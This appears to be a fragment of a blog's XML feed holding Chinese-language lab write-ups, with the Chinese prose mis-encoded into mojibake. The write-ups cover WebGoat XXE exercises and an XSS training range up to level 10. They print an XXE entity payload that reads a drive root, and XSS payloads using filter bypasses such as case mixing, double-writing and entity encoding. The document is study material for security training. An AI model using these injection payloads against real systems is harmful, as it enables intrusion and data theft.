        <content type="html"><![CDATA[<p><code>webgoat xxeé¶åœºå­¦ä¹ </code></p><span id="more"></span><h2 id="1-letâ€™s-try"><a href="#1-letâ€™s-try" class="headerlink" title="1.letâ€™s try"></a>1.letâ€™s try</h2><blockquote><p>ä»»åŠ¡ç›®æ ‡ï¼š</p><p>åœ¨æ­¤ä½œä¸šä¸­ï¼Œæ‚¨å°†å‘ç…§ç‰‡æ·»åŠ è¯„è®ºï¼Œæäº¤è¡¨å•æ—¶å°è¯•ä½¿ç”¨è¯„è®ºå­—æ®µæ‰§è¡Œ XXE æ³¨å…¥ã€‚å°è¯•åˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚</p></blockquote><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811155305646.png" alt="image-20230811155305646"></p><p>è¯„è®ºæŠ“åŒ…</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811155628447.png" alt="image-20230811155628447"></p><p>å‘ç°è¯„è®ºæ•°æ®ä¼ è¾“æ˜¯xmlæ–‡ä»¶æ ¼å¼</p><p>å°è¯•è¿›è¡Œxxeæ³¨å…¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>1.<code>&lt;!DOCTYPE&gt;æ˜¯dtdæ–‡ä»¶çš„æ ¼å¼</code></p><p>2.<code>comment []æ˜¯æ ¹ï¼ˆçˆ¶ï¼‰å…ƒç´ ï¼Œ[]ä¸­å¯ä»¥è¿›è¡Œå®šä¹‰ENTITY(å˜é‡å)æˆ–è€…ELEMENT(æ ‡ç­¾å)</code></p><p>3.<code>&lt;!ENTITY root SYSTEM &quot;file:///C:/&quot;&gt; ç”¨fileä¼ªåè®®è¯»å–Cç›˜æ ¹ç›®å½•å†…å®¹ï¼Œèµ‹å€¼ç»™å®ä½“root</code></p><p>4.<code>&amp;root;</code>è¿™ä¸ªæ˜¯å®ä½“å€¼çš„è°ƒç”¨æ ¼å¼</p></blockquote><p>å‘é€<code>payload</code></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811161301169.png" alt="image-20230811161301169"></p><h2 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h2><blockquote><p>åœ¨ç°ä»£ REST æ¡†æ¶ä¸­ï¼ŒæœåŠ¡å™¨å¯èƒ½èƒ½å¤Ÿæ¥å—æ‚¨ä½œä¸ºå¼€å‘äººå‘˜æ²¡æœ‰æƒ³åˆ°çš„</p><p>æ•°æ®æ ¼å¼ã€‚å› æ­¤ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ JSON ç«¯ç‚¹å®¹æ˜“å—åˆ° XXE æ”»å‡»ã€‚</p><p>å†æ¬¡è¿›è¡Œç›¸åŒçš„ç»ƒä¹ ï¼Œä½†å°è¯•æ‰§è¡Œä¸ç¬¬ä¸€æ¬¡ä½œä¸šç›¸åŒçš„ XML æ³¨å…¥ã€‚</p></blockquote><p>æ ¹æ®é¢˜ç›®ï¼Œå…ˆæŠ“åŒ…çœ‹çœ‹</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811165945895.png" alt="image-20230811165945895"></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811170453542.png" alt="image-20230811170453542"></p><p>æŠ“åŒ…çœ‹åˆ°çš„Content-Typeæ˜¯jsonæ ¼å¼ï¼Œé¢˜ç›®è¯´å°è¯•æ‰§è¡Œä¸ç¬¬ä¸€æ¬¡ä½œä¸šç›¸åŒçš„ XML æ³¨å…¥ï¼Œå°è¯•ä¸€ä¸‹çœ‹çœ‹</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811170925749.png" alt="image-20230811170925749"></p><p>å‘é€åï¼Œå“åº”å†…å®¹æç¤º</p><blockquote><p>You are posting JSON which does not work with a XXE</p></blockquote><p>å‘Šè¯‰æˆ‘ä»¬ï¼Œæˆ‘ä»¬å‘é€çš„æ•°æ®æ˜¯jsonï¼Œå¹¶ä¸æ˜¯æœ‰æ•ˆçš„xxeæ³¨å…¥</p><p>ä½†æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹æ˜æ˜æ˜¯xmlæ–‡ä»¶æ ¼å¼ï¼Œä¸ºä»€ä¹ˆä¼šè¢«è®¤ä¸ºæ˜¯jsonè€Œä¸æ˜¯xmlå‘¢</p><p>ä»”ç»†æŸ¥çœ‹è¯·æ±‚åŒ…ä¸­æ•°æ®å‘ç°</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172431865.png" alt="image-20230811172431865"></p><p>è¿™é‡Œçš„<code>Content-Type: application/json</code>æ˜¯jsonï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€çš„postæ•°æ®åŒ…ï¼Œä¼šè¢«jsonè§£æå™¨è§£æè€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„xmlè§£æå™¨</p><p>æ‰€ä»¥æƒ³è¦å®ç°æˆ‘ä»¬çš„xxeæ³¨å…¥ï¼Œéœ€è¦ä¿®æ”¹Content-Typeä¸ºxmlç±»å‹</p><p>å°±æ˜¯æ”¹æˆ<code>Content-Type: application/xml</code></p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172639504.png" alt="image-20230811172639504"></p><h2 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h2><blockquote><p>åœ¨ä¸Šä¸€é¡µä¸­ï¼Œæˆ‘ä»¬å‘æ‚¨å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨XXEæ”»å‡»pingæœåŠ¡å™¨ï¼Œåœ¨æ­¤ä½œä¸šä¸­å°è¯•åˆ¶ä½œä¸€ä¸ªDTDï¼Œå®ƒå°†æ–‡ä»¶æœºå¯†çš„å†…å®¹ä»WebGoatæœåŠ¡å™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„WebWolfæœåŠ¡å™¨.txtã€‚æ‚¨å¯ä»¥ä½¿ç”¨ WebWolf æ¥æä¾› DTDã€‚secret.txt ä½äº WebGoat æœåŠ¡å™¨ä¸Šçš„ä»¥ä¸‹ä½ç½®ï¼Œå› æ­¤æ‚¨æ— éœ€æ‰«ææ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼š</p><table><thead><tr><th align="left"><strong>OS</strong></th><th align="left">ä½ç½®</th></tr></thead><tbody><tr><td align="left"><code>Windows 10</code></td><td align="left"><code>C:\Users\dokiy/.webgoat-8.1.0//XXE/secret.txt</code></td></tr></tbody></table><p>å°è¯•ä½¿ç”¨ WebWolf ç™»å½•é¡µé¢ä¸Šä¼ æ­¤æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šï¼ˆæ³¨æ„ï¼šæ­¤ç«¯ç‚¹ç”±æ‚¨å®Œå…¨æ§åˆ¶ï¼‰ è·å¾—æ–‡ä»¶å†…å®¹åï¼Œå°†å…¶ä½œä¸ºæ–°è¯„è®ºå‘å¸ƒåœ¨é¡µé¢ä¸Šï¼Œæ‚¨å°†è§£å†³è¯¾ç¨‹ã€‚</p></blockquote><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811172956473.png" alt="image-20230811172956473"></p><p>æŠ“åŒ…è¯„è®º</p><p><img src="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/image-20230811212740983.png" alt="image-20230811212740983"></p><p>å‘ç°å°±æ˜¯æ­£å¸¸çš„xml</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xssé¶åœº</title>
      <link href="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/07/21/xss%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>è¿›å…¥ç¬¬ä¸€å…³ï¼ŒæŸ¥çœ‹é¡µé¢åé¦ˆä¿¡æ¯</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721213727673.png" alt="image-20230721213727673"></p><p>f12æŸ¥çœ‹ç½‘ç«™æºç ï¼Œ</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721214256934.png" alt="image-20230721214256934"></p><p>å‘ç°å‚æ•°ä¼šè¢«æ’å…¥æ ‡é¢˜ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥ä¸€æ®µç®€å•çš„å¼¹çª—ä»£ç è¿›è¡Œå°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç»“æœé¡µé¢å¼¹çª—æç¤ºæˆ‘ä»¬é€šå…³ï¼Œè¯æ˜æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åœ¨è¢«getåˆ°çš„æ—¶å€™æ²¡æœ‰ç»è¿‡ç‰¹æ®Šçš„è¿‡æ»¤å¤„ç†ã€‚</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>è¿™ä¸€å…³å¤šäº†æœç´¢æ¡†ï¼Œå°è¯•ä¸€ä¸‹ç¬¬ä¸€å…³çš„å¼¹çª—ä»£ç ï¼Œå‘ç°æ²¡æœ‰å¼¹çª—ä¹Ÿæ²¡æœ‰æç¤ºé€šå…³ï¼Œ<code>è¯æ˜è¾“å…¥çš„å†…å®¹åœ¨è¢«getçš„æ—¶å€™ç»è¿‡äº†è¿‡æ»¤ï¼Œä»£ç ä¸ç”Ÿæ•ˆã€‚</code></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721215641260.png" alt="image-20230721215641260"></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721220340715.png" alt="image-20230721220340715"></p><p>æŸ¥çœ‹ç½‘ç«™æºç ï¼Œå‘ç°valueå€¼æ˜¯ç”¨åŒå¼•å·é—­åˆçš„</p><p>é—­åˆvalueå€¼ä¹‹åï¼Œæˆ‘ä»¬è¿˜è¦é—­åˆæ‰inputæ ‡ç­¾ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹å¼¹çª—ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722092957076.png" alt="image-20230722092957076"></p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>å…ˆæŒ‰ç…§ä¸Šä¸€å…³çš„playloadè¯•è¯•ï¼Œå‘ç°ä¸è¡Œï¼ŒæŸ¥çœ‹æºä»£ç </p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722094256601.png" alt="image-20230722094256601"></p><p>valueå€¼ç”¨<code>å•å¼•å·é—­åˆ</code>ï¼Œ&lt;&gt;è¢«è½¬ä¹‰æˆä¸ºå­—ç¬¦äº†</p><p>onè§¦å‘ä¸€ä¸ªäº‹ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722095314351.png" alt="image-20230722095314351"></p><h3 id="onäº‹ä»¶"><a href="#onäº‹ä»¶" class="headerlink" title="onäº‹ä»¶"></a>onäº‹ä»¶</h3><p>onmouseoverï¼š</p><p>onclick:</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>å°è¯•playloadï¼Œè¿›è¡Œæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;script&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç½‘ç«™æºä»£ç </p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722102719549.png" alt="image-20230722102719549"></p><p>å‘ç°å¯¹keywordçš„å‚æ•°ä¸­&lt;&gt;æ›¿æ¢ä¸ºç©ºï¼Œä½¿ç”¨æ²¡æœ‰&lt;&gt;çš„payloadè¿›è¡Œç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>å¼€å§‹è¯•ä¸€ä¸‹å¼¹çª—ä»£ç ï¼ŒæŸ¥çœ‹æºä»£ç </p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722141710392.png" alt="image-20230722141710392"></p><p>å‘çº¿æºä»£ç ä¸­é™åˆ¶äº†<script>æ ‡ç­¾çš„ä½¿ç”¨ï¼Œå†è¯•è¯•onæ—¶é—´</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142027718.png" alt="image-20230722142027718"></p><p>onè¢«é™åˆ¶äº†o_näº†ï¼Œå†è¯•è¯•åˆ«çš„</p><h3 id="a-hrefæ ‡ç­¾æ³•"><a href="#a-hrefæ ‡ç­¾æ³•" class="headerlink" title="a-hrefæ ‡ç­¾æ³•"></a><strong>a-hrefæ ‡ç­¾æ³•</strong></h3><p>hrefå±æ€§çš„æ„æ€æ˜¯ å½“æ ‡ç­¾<a>è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘æ‰§è¡Œè½¬è·³ï¼Œå¯ä»¥æ˜¯è½¬è·³åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œè¿˜å¯ä»¥è§¦å‘æ‰§è¡Œä¸€æ®µjsä»£ç </p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æœ€åæ„é€ å‡½æ•°æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142907058.png" alt="image-20230722142907058"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>è·Ÿç¬¬äº”å…³ä¸€æ ·ï¼Œ<script>æ ‡ç­¾è¢«é™åˆ¶äº†ï¼Œonæ—¶é—´å‡½æ•°ä¹Ÿè¢«é™åˆ¶äº†</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722144301370.png" alt="image-20230722144301370"></p><p>å°è¯•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&#x27;a&#x27;)&gt;sss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722145133315.png" alt="image-20230722145133315"></p><p><a herf>ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå†è¯•è¯•åˆ«çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>å¥½åƒæ²¡æœ‰strtolowerå‡½æ•°æ¬¸ï¼Œå¯¹å§ï¼Œä½ æ˜¯ä¸æ˜¯æ²¡è¿‡æ»¤å¤§å°å†™ã€‚</p><p>æ’å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722150000808.png" alt="image-20230722150000808"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>è·Ÿç¬¬å…­å…³ç›¸ä¼¼ï¼Œ<script>è¢«è¿‡æ»¤äº†ï¼Œonæ—¶é—´è¢«è¿‡æ»¤äº†ï¼Œ <herf>ä¹Ÿè¢«è¿‡æ»¤äº†</p><p>â€‹        <img src="xss%E9%9D%B6%E5%9C%BA/image-20230722232132664.png" alt="image-20230722232132664">                     </p><p>æˆ‘ä»¬è¯•ä¸€ä¸‹åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145351825.png" alt="image-20230723145351825"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145226140.png" alt="image-20230723145226140"></p><p>å¥½åƒscriptä¹Ÿè¿‡æ»¤äº†ï¼Œè¯•è¯•åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascriptipt:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145624818.png" alt="image-20230723145624818"></p><p>æˆåŠŸï¼</p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>è¿™ä¸€å…³è·Ÿç¬¬ä¸ƒå…³ç›¸æ¯”ï¼Œ<code>&lt;script&gt;</code>è¢«é™åˆ¶äº†ï¼Œonäº‹ä»¶ä¹Ÿé™åˆ¶äº†</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723150209793.png" alt="image-20230723150209793"></p><blockquote><p><code>hrefæœ‰ä¸€ä¸ªéšè—å±æ€§ï¼Œä¼šè‡ªåŠ¨Unicodeè§£ç ï¼Œå¯ä»¥åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡</code></p></blockquote><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231149808.png" alt="image-20230723231149808"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231249977.png" alt="image-20230723231249977"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>å…ˆè¾“å…¥ä¸Šä¸€é“é¢˜çš„payloadï¼Œä¼šæç¤ºé“¾æ¥ä¸åˆæ³•ã€‚</p><p>çœ‹çœ‹é‡Œé¢æºç ï¼Œæ˜¾ç¤º</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724215148579.png" alt="image-20230724215148579"></p><p>strops()å‡½æ•°è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å…³å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœå­˜åœ¨ï¼Œè¿”å›æ•°å­—ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›falseã€‚<code>å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿï¼Œç”¨è¿™ä¸ªå‡½æ•°æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨æŸä¸ªå­—ç¬¦æ—¶å¿…é¡»ä½¿ç”¨===false</code></p><p>= ç”¨äºæ¯”è¾ƒ åˆ¤æ–­ ä¸¤è€…ç›¸ç­‰  ==åœ¨æ¯”è¾ƒçš„æ—¶å€™å¯ä»¥è‡ªåŠ¨æ¢æˆæ•°æ®ç±»å‹</p><p>===ç”¨äºä¸¥æ ¼æ¯”è¾ƒ åˆ¤æ–­ä¸¤è€…ä¸¥æ ¼ç›¸ç­‰ï¼Œä¸¥æ ¼æ¯”è¾ƒä¸ä¼šè¿›è¡Œè‡ªåŠ¨è½¬æ¢ï¼Œè¦æ±‚è¿›è¡Œæ¯”è¾ƒçš„æ“ä½œæ•°å¿…é¡»ç±»å‹ä¸€è‡´ï¼Œä¸ä¸€è‡´æ—¶è¿”å›flase</p><p>==å€¼ç›¸ç­‰  ï¼Œ ===å€¼å’Œç±»å‹ç›¸åŒ</p><p>æ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥ç¬¬å…«å…³çš„payloadæ—¶ï¼Œè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«é¢˜ç›®çš„<code>http://</code>å­—ç¬¦ä¸²ï¼Œè¿”å›falseï¼Œ===æ¯”è¾ƒå€¼å’Œç±»å‹ï¼Œæ‰€ä»¥ä¼šæ‰“å°<code>æ‚¨çš„é“¾æ¥ä¸åˆæ³•</code>ï¼Œ</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725102329283.png" alt="image-20230725102329283"></p><p>æˆ‘ä»¬æƒ³è®©ä¼ªåè®®å’Œhttp://å…±å­˜ï¼Œå¯ä»¥æŠŠhttpæ³¨é‡Šæ‰ï¼Œä¹‹æ‰€ä»¥ä¸ä¼šå‡ºé”™æ˜¯å› ä¸ºhttp://æ˜¯ä¸ªå¿…é¡»å‡ºç°çš„å­—ç¬¦ï¼Œè¿™ä¸ªä¸æ˜¯é‡è¦çš„å­—ç¬¦ï¼Œåªè¦å‡ºç°ï¼Œå¹¶ä¸”ä¸è®©åå°è¯»å–å°±å¯ä»¥äº†</p><p>æ„é€ çš„payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029  //http://</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725104741241.png" alt="image-20230725104741241"></p><h2 id="level-10-éšè—è¡¨å•å­—æ®µæ³¨å…¥"><a href="#level-10-éšè—è¡¨å•å­—æ®µæ³¨å…¥" class="headerlink" title="level-10(éšè—è¡¨å•å­—æ®µæ³¨å…¥)"></a>level-10(éšè—è¡¨å•å­—æ®µæ³¨å…¥)</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°è¡¨å•ä¸­çš„typeå±æ€§å€¼éƒ½æ˜¯hiddenï¼ˆéšè—ï¼‰</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724231311117.png" alt="image-20230724231311117"></p><p>æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_link=222&amp;t_history=55&amp;t_sort=123</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725215159398.png" alt="image-20230725215159398"></p><p>çœ‹æºç æ˜¾ç¤ºï¼Œåªæœ‰t_sortæ˜¾ç¤ºå‡ºæ¥ï¼Œå¯ä»¥æ¨å‡ºt_sortæ˜¯xssçš„æ”»å‡»ç‚¹</p><p>å…ˆé—­åˆå¼•å·å’Œå°–æ‹¬å·çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725220314548.png" alt="image-20230725220314548"></p><p>å‘ç°å°–æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯è¦å®ç°xssè¿˜æ˜¯è¦è®©typeçš„hiddenå¤±æ•ˆ</p><p>æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><blockquote><p>çœ‹åˆ°æˆ‘ä»¬çš„xssæ”»å‡»ç‚¹åœ¨<code>type=&quot;hidden&quot;</code>å‰é¢ï¼Œ</p><p>æ‰€ä»¥è€ƒè™‘ç”¨htmlä¸­çš„è°åœ¨å‰ï¼Œè°ä¼˜å…ˆçš„åŸåˆ™ï¼Œ</p><p>åœ¨å…¶å‰é¢æå‰å®šä¹‰ä¸€ä¸ª<code>type=&quot;text&quot;</code></p><p>ä½¿å¾—<code>type=&quot;hidden&quot;</code>æ— æ•ˆåŒ–ï¼Œä»è€Œå®ç°xssçš„ç›®çš„</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot;onclick=&#x27;alert(1)&#x27;  type=&#x27;text&#x27;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221100590.png" alt="image-20230725221100590"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221235637.png" alt="image-20230725221235637"></p><p>çœ‹ç½‘ç«™æºç ï¼Œ</p><p>å‘ç°ç½‘ç«™è¯»å–ä¸¤ä¸ªå¯æ§å‚æ•°ï¼Œkeywordï¼Œt_sort</p><p>çŒœæµ‹xssæ”»å‡»ç‚¹åœ¨å…¶ä¸­ä¸€ä¸ª</p><p>ä½†æ˜¯keywordçš„$strè¢«htmlspecialcharsç»™è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æ— æ³•å®ç°xss</p><p>æ‰€ä»¥ä¹Ÿå¯ä»¥æ¨å‡ºt_sortæ‰æ˜¯xssæ”»å‡»ç‚¹ï¼Œè€Œä¸”å…¶èµ‹å€¼å‚æ•°$str11åªè¿‡æ»¤äº†&lt;&gt;ï¼Œç„¶åç›´æ¥æ’å…¥é¡µé¢ä¸­ï¼Œä»è€Œæ¨å¯¼å‡ºpayload</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724235700474.png" alt="image-20230724235700474"></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2></script></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´é¶åœºå­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxåŸºç¡€å‘½ä»¤</title>
      <link href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
